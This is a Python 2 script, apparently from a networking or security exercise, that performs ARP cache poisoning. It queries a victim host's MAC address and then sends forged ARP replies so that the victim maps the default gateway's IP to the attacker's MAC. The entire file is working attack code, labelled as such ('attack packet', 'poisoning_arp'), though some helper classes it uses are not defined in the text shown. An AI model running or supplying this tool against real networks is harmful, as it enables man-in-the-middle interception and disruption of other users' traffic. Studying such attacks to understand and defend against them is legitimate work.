import sys
import string
import struct
import pcap
import netifaces


def main():
    if len(sys.argv) != 2:
        print 'Usage: python send_arp.py <victim ip>'
        exit(1)

    device_name = pcap.lookupdev()
    addresses = netifaces.ifaddresses(device_name)

    my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
    my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])

    gateway_ip = IPv4Address(netifaces.gateways()['default'][netifaces.AF_INET][0])
    victim_ip = IPv4Address(sys.argv[1])
    print

    # ask victim his mac address
    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')

    asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
    asking_arp.send(pcap_handle)
    print '[<+] Sent victim({0}) a ARP request'.format(victim_ip)

    # wait for victim's response
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation != ARP.OP_REPLY:
            continue
        if arp.sender_protocol_address != victim_ip:
            continue
        victim_mac = arp.sender_hardware_address
        print "[>+] victim replied his mac is '{0}'".format(victim_mac.in_string)
        break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # attack packet
    poisoning_arp = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)

    # additionally, grab victim's ARP request and send attack packet
    pcap_handle = pcap.pcap(timeout_ms=1000)
    pcap_handle.setfilter('arp')

    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation != ARP.OP_REQUEST:
            continue
        if arp.sender_protocol_address != victim_ip:
            continue
        if arp.sender_hardware_address != victim_mac:
            continue
        if arp.target_protocol_address != gateway_ip:
            continue
        print "[>+] Victim sent ARP request for ip '{}'".format(gateway_ip)
        for i in xrange(3):
            poisoning_arp.send(pcap_handle)
            print '[<+] Sent victim attack packet ({})'.format(i)


if __name__ == '__main__':
    main()
